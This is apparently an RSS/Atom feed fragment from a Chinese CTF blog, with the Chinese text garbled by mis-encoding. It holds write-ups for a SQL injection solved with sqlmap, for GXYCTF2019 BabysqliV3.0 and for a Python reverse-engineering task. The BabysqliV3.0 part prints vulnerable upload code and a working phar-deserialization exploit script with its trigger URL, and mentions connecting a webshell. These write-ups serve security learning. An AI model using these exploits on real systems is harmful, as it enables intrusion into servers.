        <content type="html"><![CDATA[<h2 id="å‰è¨€"><a href="#å‰è¨€" class="headerlink" title="å‰è¨€"></a>å‰è¨€</h2><p>å…³é”®å­—:[SQLMAP]</p><p><img src="/../images/%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0-b01lers2020-Life-on-Mars/image-20210819140435511.png"></p><h2 id="é¢˜è§£"><a href="#é¢˜è§£" class="headerlink" title="é¢˜è§£"></a>é¢˜è§£</h2><p>æŠ“åˆ°åŒ…</p><p><img src="/../images/%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0-b01lers2020-Life-on-Mars/image-20210819145141889.png"></p><p>è¯•äº†ä¸‹ï¼Œæ²¡æƒ³åˆ°æ˜¯SQLæ³¨å…¥ï¼Œç”¨order byæµ‹è¯•ä¸‹ï¼Œä¸¤ä¸ªå­—æ®µã€‚</p><p><img src="/../images/%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0-b01lers2020-Life-on-Mars/image-20210819145933284.png"></p><p><img src="/../images/%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0-b01lers2020-Life-on-Mars/image-20210819145926078.png"></p><p>sqlmapè·‘ä¸€ä¸‹ï¼Œæ²¡å•¥å¥½è¯´çš„äº†ã€‚</p><pre class="line-numbers language-none"><code class="language-none">-D alien_code -T code -C code --dump<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>]]></content>
      
      
      <categories>
          
          <category> Web </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CTF </tag>
            
            <tag> Web </tag>
            
            <tag> SQLæ³¨å…¥ </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>åˆ·é¢˜ç¬”è®°:[GXYCTF2019]BabysqliV3.0</title>
      <link href="/p/1000059223.html"/>
      <url>/p/1000059223.html</url>
      
        <content type="html"><![CDATA[<h2 id="å‰è¨€"><a href="#å‰è¨€" class="headerlink" title="å‰è¨€"></a>å‰è¨€</h2><p>å…³é”®å­—:[phar|æ‰‹åŠ¨æ¿€æ´»phar|phar:///]</p><p><img src="/../images/%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0-GXYCTF2019-BabysqliV3-0/image-20210818223134859.png"></p><h2 id="é¢˜è§£"><a href="#é¢˜è§£" class="headerlink" title="é¢˜è§£"></a>é¢˜è§£</h2><p><img src="/../images/%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0-GXYCTF2019-BabysqliV3-0/image-20210818224334283.png"></p><p>ç”¨æˆ·åè¾“å…¥admin</p><p><img src="/../images/%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0-GXYCTF2019-BabysqliV3-0/image-20210818224349239.png"></p><p>è¯•äº†ä¸‹ä¹Ÿæ²¡æ‰¾ç€æ³¨å…¥ç‚¹ï¼Œå…ˆçˆ†ç ´ä¸€ä¸‹å§ã€‚</p><p>è·‘å‡ºæ¥å¯†ç æ˜¯password</p><p>/home.php?file=upload</p><p><img src="/../images/%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0-GXYCTF2019-BabysqliV3-0/image-20210818224938800.png"></p><p>å°è¯•ä¸‹ä¼ªåè®®ï¼Œæ‹¿åˆ°upload.phpæºç </p><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>meta</span> <span class="token attr-name">http-equiv</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>Content-Type<span class="token punctuation">"</span></span> <span class="token attr-name">content</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>text/html; charset=utf-8<span class="token punctuation">"</span></span> <span class="token punctuation">/></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>form</span> <span class="token attr-name">action</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span><span class="token punctuation">"</span></span> <span class="token attr-name">method</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>post<span class="token punctuation">"</span></span> <span class="token attr-name">enctype</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>multipart/form-data<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>    ä¸Šä¼ æ–‡ä»¶    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>input</span> <span class="token attr-name">type</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>file<span class="token punctuation">"</span></span> <span class="token attr-name">name</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>file<span class="token punctuation">"</span></span> <span class="token punctuation">/></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>input</span> <span class="token attr-name">type</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>submit<span class="token punctuation">"</span></span> <span class="token attr-name">name</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>submit<span class="token punctuation">"</span></span> <span class="token attr-name">value</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>ä¸Šä¼ <span class="token punctuation">"</span></span> <span class="token punctuation">/></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>form</span><span class="token punctuation">></span></span><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token function">error_reporting</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">class</span> <span class="token class-name-definition class-name">Uploader</span><span class="token punctuation">&#123;</span>    <span class="token keyword">public</span> <span class="token variable">$Filename</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token variable">$cmd</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token variable">$token</span><span class="token punctuation">;</span>    <span class="token keyword">function</span> <span class="token function-definition function">__construct</span><span class="token punctuation">(</span><span class="token punctuation">)</span>    <span class="token punctuation">&#123;</span>        <span class="token variable">$sandbox</span> <span class="token operator">=</span> <span class="token function">getcwd</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">.</span> <span class="token string double-quoted-string">"/uploads/"</span> <span class="token operator">.</span> <span class="token function">md5</span><span class="token punctuation">(</span><span class="token variable">$_SESSION</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'user'</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">.</span> <span class="token string double-quoted-string">"/"</span><span class="token punctuation">;</span>        <span class="token variable">$ext</span> <span class="token operator">=</span> <span class="token string double-quoted-string">".txt"</span><span class="token punctuation">;</span>        @<span class="token function">mkdir</span><span class="token punctuation">(</span><span class="token variable">$sandbox</span><span class="token punctuation">,</span> <span class="token number">0777</span><span class="token punctuation">,</span> <span class="token constant boolean">true</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'name'</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token keyword">and</span> <span class="token operator">!</span><span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"/data:\/\/ | filter:\/\/ | php:\/\/ | \./i"</span><span class="token punctuation">,</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'name'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>            <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">Filename</span> <span class="token operator">=</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'name'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span> <span class="token keyword">else</span> <span class="token punctuation">&#123;</span>            <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">Filename</span> <span class="token operator">=</span> <span class="token variable">$sandbox</span> <span class="token operator">.</span> <span class="token variable">$_SESSION</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'user'</span><span class="token punctuation">]</span> <span class="token operator">.</span> <span class="token variable">$ext</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>        <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">cmd</span> <span class="token operator">=</span> <span class="token string double-quoted-string">"echo '&lt;br>&lt;br>Master, I want to study rizhan!&lt;br>&lt;br>';"</span><span class="token punctuation">;</span>        <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">token</span> <span class="token operator">=</span> <span class="token variable">$_SESSION</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'user'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">function</span> <span class="token function-definition function">upload</span><span class="token punctuation">(</span><span class="token variable">$file</span><span class="token punctuation">)</span>    <span class="token punctuation">&#123;</span>        <span class="token keyword">global</span> <span class="token variable">$sandbox</span><span class="token punctuation">;</span>        <span class="token keyword">global</span> <span class="token variable">$ext</span><span class="token punctuation">;</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"[^a-z0-9]"</span><span class="token punctuation">,</span> <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">Filename</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>            <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">cmd</span> <span class="token operator">=</span> <span class="token string double-quoted-string">"die('illegal filename!');"</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span> <span class="token keyword">else</span> <span class="token punctuation">&#123;</span>            <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token variable">$file</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'size'</span><span class="token punctuation">]</span> <span class="token operator">></span> <span class="token number">1024</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>                <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">cmd</span> <span class="token operator">=</span> <span class="token string double-quoted-string">"die('you are too big (â€²â–½`ã€ƒ)');"</span><span class="token punctuation">;</span>            <span class="token punctuation">&#125;</span> <span class="token keyword">else</span> <span class="token punctuation">&#123;</span>                <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">cmd</span> <span class="token operator">=</span> <span class="token string double-quoted-string">"move_uploaded_file('"</span> <span class="token operator">.</span> <span class="token variable">$file</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'tmp_name'</span><span class="token punctuation">]</span> <span class="token operator">.</span> <span class="token string double-quoted-string">"', '"</span> <span class="token operator">.</span> <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">Filename</span> <span class="token operator">.</span> <span class="token string double-quoted-string">"');"</span><span class="token punctuation">;</span>            <span class="token punctuation">&#125;</span>        <span class="token punctuation">&#125;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">function</span> <span class="token function-definition function">__toString</span><span class="token punctuation">(</span><span class="token punctuation">)</span>    <span class="token punctuation">&#123;</span>        <span class="token keyword">global</span> <span class="token variable">$sandbox</span><span class="token punctuation">;</span>        <span class="token keyword">global</span> <span class="token variable">$ext</span><span class="token punctuation">;</span>        <span class="token comment">// return $sandbox.$this->Filename.$ext;</span>        <span class="token keyword">return</span> <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">Filename</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">function</span> <span class="token function-definition function">__destruct</span><span class="token punctuation">(</span><span class="token punctuation">)</span>    <span class="token punctuation">&#123;</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-></span><span class="token property">token</span> <span class="token operator">!=</span> <span class="token variable">$_SESSION</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'user'</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>            <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">cmd</span> <span class="token operator">=</span> <span class="token string double-quoted-string">"die('check token falied!');"</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>        <span class="token keyword">eval</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-></span><span class="token property">cmd</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_FILES</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'file'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    <span class="token variable">$uploader</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Uploader</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token variable">$uploader</span><span class="token operator">-></span><span class="token function">upload</span><span class="token punctuation">(</span><span class="token variable">$_FILES</span><span class="token punctuation">[</span><span class="token string double-quoted-string">"file"</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span>@<span class="token function">file_get_contents</span><span class="token punctuation">(</span><span class="token variable">$uploader</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token keyword">echo</span> <span class="token string double-quoted-string">"ä¸‹é¢æ˜¯ä½ ä¸Šä¼ çš„æ–‡ä»¶ï¼š&lt;br>"</span> <span class="token operator">.</span> <span class="token variable">$uploader</span> <span class="token operator">.</span> <span class="token string double-quoted-string">"&lt;br>"</span><span class="token punctuation">;</span>        <span class="token keyword">echo</span> <span class="token function">file_get_contents</span><span class="token punctuation">(</span><span class="token variable">$uploader</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token delimiter important">?></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>åœ¨è¿™å¯ä»¥æ‰§è¡Œå‘½ä»¤ï¼Œçœ‹çœ‹$cmdèƒ½å¦æ§åˆ¶ã€‚</p><p><img src="/../images/%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0-GXYCTF2019-BabysqliV3-0/image-20210818235954167.png"></p><p>æ–‡ä»¶ä¸Šä¼ +ç±»ä¼¼ååºåˆ—åŒ–çš„ç±»åˆæ²¡æœ‰ååºåˆ—åŒ–å‡½æ•°ï¼Œå¯ä»¥è€ƒè™‘phar</p><p>æ„é€ ä¸‹popé“¾ï¼š</p><pre class="line-numbers language-none"><code class="language-none">__destruct() &lt;-<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>popé“¾è¿˜æ²¡æ„é€ å®Œï¼Œå‘ç°è¿™ä¸ªä»£ç </p><p><img src="/../images/%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0-GXYCTF2019-BabysqliV3-0/image-20210819001119305.png"></p><p>è¯•äº†ä¸‹ç›´æ¥ä¼ è¿›å»äº†</p><p><img src="/../images/%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0-GXYCTF2019-BabysqliV3-0/image-20210819001144591.png"></p><p><img src="/../images/%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0-GXYCTF2019-BabysqliV3-0/image-20210819001201859.png"></p><p>å¹¸ç¦æ¥çš„å¤ªçªç„¶</p><p><img src="/../images/%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0-GXYCTF2019-BabysqliV3-0/QQ%E5%9B%BE%E7%89%8720210819001215.jpg"></p><p>è¿æ¥èšå‰‘ï¼Œç»“æŸã€‚</p><p>è¿˜æ„é€ ä¸ªpæ„é€ ã€‚</p><p>ç®—äº†è¿˜æ˜¯ç»§ç»­å­¦ä¹ ä¸‹ã€‚</p><h3 id="pharååºåˆ—åŒ–"><a href="#pharååºåˆ—åŒ–" class="headerlink" title="pharååºåˆ—åŒ–"></a>pharååºåˆ—åŒ–</h3><blockquote><p>phar:ä¼ªåè®®å¯ä»¥ä¸ä¾èµ–unserialize()ç›´æ¥è¿›è¡Œååºåˆ—åŒ–æ“ä½œï¼Œ</p></blockquote><p>$uploaderä¸ºå¯¹è±¡ï¼Œè¿™é‡Œä¼šè§¦å‘<code>__toString()</code>ï¼Œè€Œä¸”<code>file_get_contents()</code>å¯ä»¥é…åˆä¼ªåè®®ï¼Œå°±é€ æˆäº†pharååºåˆ—åŒ–æ¼æ´ç‚¹ã€‚</p><p><img src="/../images/%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0-GXYCTF2019-BabysqliV3-0/image-20210819001624504.png"></p><p>$Filenameæ˜¯å¯æ§çš„ï¼Œ<img src="/../images/%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0-GXYCTF2019-BabysqliV3-0/image-20210819005913757.png"></p><p>è¿™æ ·å°±å¯ä»¥è®©<code>file_get_contents()</code>å»è§¦å‘phar</p><p>å…ˆæŠŠtokenè®°ä¸‹æ¥</p><p><img src="/../images/%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0-GXYCTF2019-BabysqliV3-0/image-20210819003715193.png"></p><p>ç”Ÿæˆpharæ–‡ä»¶ç„¶åä¸Šä¼ ã€‚</p><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token keyword">class</span> <span class="token class-name-definition class-name">Uploader</span><span class="token punctuation">&#123;</span>    <span class="token keyword">public</span> <span class="token variable">$Filename</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token variable">$cmd</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token variable">$token</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token variable">$a</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Uploader</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$a</span><span class="token operator">-></span><span class="token property">Filename</span> <span class="token operator">=</span> <span class="token string double-quoted-string">"test"</span><span class="token punctuation">;</span><span class="token variable">$a</span><span class="token operator">-></span><span class="token property">token</span> <span class="token operator">=</span> <span class="token string double-quoted-string">"GXY7f17dc42f4567993f9be1dcb117e757d"</span><span class="token punctuation">;</span><span class="token variable">$a</span><span class="token operator">-></span><span class="token property">cmd</span> <span class="token operator">=</span> <span class="token string single-quoted-string">'highlight_file("/var/www/html/flag.php");'</span><span class="token punctuation">;</span>@<span class="token function">unlink</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"phar.phar"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$phar</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Phar</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"phar.phar"</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">//åç¼€åå¿…é¡»ä¸ºphar</span><span class="token variable">$phar</span><span class="token operator">-></span><span class="token function">startBuffering</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$phar</span><span class="token operator">-></span><span class="token function">setStub</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"&lt;?php __HALT_COMPILER(); ?>"</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">//è®¾ç½®stub</span><span class="token variable">$phar</span><span class="token operator">-></span><span class="token function">setMetadata</span><span class="token punctuation">(</span><span class="token variable">$a</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">//å°†è‡ªå®šä¹‰çš„meta-dataå­˜å…¥manifest</span><span class="token variable">$phar</span><span class="token operator">-></span><span class="token function">addFromString</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"exp.txt"</span><span class="token punctuation">,</span> <span class="token string double-quoted-string">"test"</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">//æ·»åŠ è¦å‹ç¼©çš„æ–‡ä»¶</span><span class="token comment">//ç­¾åè‡ªåŠ¨è®¡ç®—</span><span class="token variable">$phar</span><span class="token operator">-></span><span class="token function">stopBuffering</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><img src="/../images/%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0-GXYCTF2019-BabysqliV3-0/image-20210819005211484.png" alt="image-20210819005211484"></p><p>å†ç”¨pharåè®®è§¦å‘ååºåˆ—åŒ–</p><pre class="line-numbers language-none"><code class="language-none">?file&#x3D;upload&amp;name&#x3D;phar:&#x2F;&#x2F;&#x2F;var&#x2F;www&#x2F;html&#x2F;uploads&#x2F;809e1a55c1990c491e2578068d1ae0e3&#x2F;GXY7f17dc42f4567993f9be1dcb117e757d.txt<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>æœ€åéšä¾¿ä¸Šä¼ ä¸ªæ–‡ä»¶ï¼Œè¿”å›ä¹‹å‰ååºåˆ—åŒ–çš„ç±»ã€‚</p><p>å…¶å®åœ¨ä¹‹å‰å°±å¯ä»¥æ„Ÿè§‰å¾—åˆ°ï¼Œä¸Šä¼ æ–‡ä»¶ï¼Œä¸ä¼šé©¬ä¸Šç»™å‡ºåé¦ˆï¼Œè€Œæ˜¯ä¸Šä¼ ä¸‹ä¸€ä¸ªæ–‡ä»¶çš„æ—¶å€™æŠŠä¸Šä¸€ä¸ªä¸Šä¼ çš„ç»“æœåé¦ˆå‡ºæ¥ã€‚</p><p><img src="/../images/%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0-GXYCTF2019-BabysqliV3-0/image-20210819005355530.png"></p>]]></content>
      
      
      <categories>
          
          <category> Web </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CTF </tag>
            
            <tag> Web </tag>
            
            <tag> PHPä»£ç å®¡è®¡ </tag>
            
            <tag> phar </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>åˆ·é¢˜ç¬”è®°:[æå®¢å°‘å¹´æŒ‘æˆ˜èµ›]Easy_re</title>
      <link href="/p/1953862148.html"/>
      <url>/p/1953862148.html</url>
      
        <content type="html"><![CDATA[<h2 id="å‰è¨€"><a href="#å‰è¨€" class="headerlink" title="å‰è¨€"></a>å‰è¨€</h2><p>å¥½å‹å‘æ¥çš„é¢˜ï¼ŒçœŸéš¾å•Š</p><h2 id="é¢˜è§£"><a href="#é¢˜è§£" class="headerlink" title="é¢˜è§£"></a>é¢˜è§£</h2><p><img src="/../images/%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0-%E6%9E%81%E5%AE%A2%E5%B0%91%E5%B9%B4%E6%8C%91%E6%88%98%E8%B5%9B-Easy-re/image-20210818212446397.png"></p><p>å…¶å®ä¸ç”¨æŸ¥ï¼Œçœ‹å›¾æ ‡ä¹ŸçŸ¥é“</p><p><img src="/../images/%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0-%E6%9E%81%E5%AE%A2%E5%B0%91%E5%B9%B4%E6%8C%91%E6%88%98%E8%B5%9B-Easy-re/image-20210818212505103.png"></p><p>ç”¨pyinstxtractoråç¼–è¯‘ä¸€ä¸‹ï¼Œæ‰¾åˆ°ç”Ÿæˆçš„main.pycã€‚</p><p>ç„¶åå°è¯•ç”¨uncompyle6åç¼–è¯‘pycï¼Œä¼šå‘ç°åç¼–è¯‘ä¸äº†python3.9å­—èŠ‚ç ï¼Œä¸€çœ‹githubï¼Œrockyå¤±ä¸šåœ¨å®¶ç»§ç»­æåŠ©æ‰èƒ½æ›´æ–°æ”¯æŒpy3.9ã€‚</p><p>ä½†å¼ºä¸­è‡ªæœ‰å¼ºä¸­æ‰‹ï¼Œæœ‰å¸ˆå‚…æƒ³åˆ°äº†å…¶ä»–åŠæ³•ã€‚</p><p>å°†pycçš„æ–‡ä»¶å¤´æ”¹ä¸º</p><pre class="line-numbers language-none"><code class="language-none">55 0D 0D 0A 01 00 00 00 4F D1 5B 87 C5 55 2F 42<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="/../images/%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0-%E6%9E%81%E5%AE%A2%E5%B0%91%E5%B9%B4%E6%8C%91%E6%88%98%E8%B5%9B-Easy-re/image-20210818213224633.png"></p><p>è¿™æ ·å°±æŠŠè¿™ä¸ªpycè¯†åˆ«ä¸ºpython3.8</p><p>ç„¶åå°±èƒ½åç¼–è¯‘äº†ã€‚</p><p><img src="/../images/%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0-%E6%9E%81%E5%AE%A2%E5%B0%91%E5%B9%B4%E6%8C%91%E6%88%98%E8%B5%9B-Easy-re/image-20210818213443646.png"></p><p>è§£å‡ºæ¥ä»£ç å¦‚ä¸‹ï¼š</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token comment"># uncompyle6 version 3.7.4</span><span class="token comment"># Python bytecode 3.8 (3413)</span><span class="token comment"># Decompiled from: Python 3.8.10 (default, May 19 2021, 13:12:57) [MSC v.1916 64 bit (AMD64)]</span><span class="token comment"># Embedded file name: main.py</span><span class="token comment"># Compiled at: 2041-12-18 09:05:19</span><span class="token comment"># Size of source mod 2**32: 1110398405 bytes</span><span class="token keyword">import</span> base64<span class="token keyword">def</span> <span class="token function">encode</span><span class="token punctuation">(</span>message<span class="token punctuation">)</span><span class="token punctuation">:</span>    s <span class="token operator">=</span> <span class="token string">''</span>    <span class="token keyword">for</span> i <span class="token keyword">in</span> message<span class="token punctuation">:</span>        x <span class="token operator">=</span> i <span class="token operator">^</span> <span class="token number">32</span>        x <span class="token operator">=</span> x <span class="token operator">+</span> <span class="token number">16</span>        s <span class="token operator">+=</span> <span class="token builtin">chr</span><span class="token punctuation">(</span>x<span class="token punctuation">)</span>    <span class="token keyword">else</span><span class="token punctuation">:</span>        <span class="token keyword">return</span> base64<span class="token punctuation">.</span>b64encode<span class="token punctuation">(</span>s<span class="token punctuation">.</span>encode<span class="token punctuation">(</span><span class="token string">'utf-8'</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">enCodeAgain</span><span class="token punctuation">(</span>string<span class="token punctuation">,</span> space<span class="token punctuation">)</span><span class="token punctuation">:</span>    s <span class="token operator">=</span> <span class="token string">''</span>    string <span class="token operator">=</span> <span class="token builtin">str</span><span class="token punctuation">(</span>string<span class="token punctuation">,</span> <span class="token string">'utf-8'</span><span class="token punctuation">)</span>    <span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span> space<span class="token punctuation">)</span><span class="token punctuation">:</span>        <span class="token keyword">for</span> j <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span>i<span class="token punctuation">,</span> <span class="token builtin">len</span><span class="token punctuation">(</span>string<span class="token punctuation">)</span><span class="token punctuation">,</span> space<span class="token punctuation">)</span><span class="token punctuation">:</span>            <span class="token keyword">if</span> j <span class="token operator">&lt;</span> <span class="token builtin">len</span><span class="token punctuation">(</span>string<span class="token punctuation">)</span><span class="token punctuation">:</span>                s <span class="token operator">+=</span> string<span class="token punctuation">[</span>j<span class="token punctuation">]</span>        <span class="token keyword">else</span><span class="token punctuation">:</span>            <span class="token keyword">return</span> scorrect <span class="token operator">=</span> <span class="token string">'VxVtd5dKIPjMw9wVb=lR2WVTcPWC2goWoeQ='</span>flag <span class="token operator">=</span> <span class="token string">''</span><span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'Input flag:'</span><span class="token punctuation">)</span>flag <span class="token operator">=</span> <span class="token builtin">input</span><span class="token punctuation">(</span><span class="token punctuation">)</span>flag <span class="token operator">=</span> flag<span class="token punctuation">.</span>encode<span class="token punctuation">(</span><span class="token string">'utf-8'</span><span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span>enCodeAgain<span class="token punctuation">(</span>encode<span class="token punctuation">(</span>flag<span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token number">2</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token keyword">if</span> enCodeAgain<span class="token punctuation">(</span>encode<span class="token punctuation">(</span>flag<span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token number">2</span><span class="token punctuation">)</span> <span class="token operator">==</span> correct<span class="token punctuation">:</span>    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'correct'</span><span class="token punctuation">)</span><span class="token keyword">else</span><span class="token punctuation">:</span>    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'wrong'</span><span class="token punctuation">)</span><span class="token comment"># okay decompiling test.pyc</span><span aria-hidden="true" 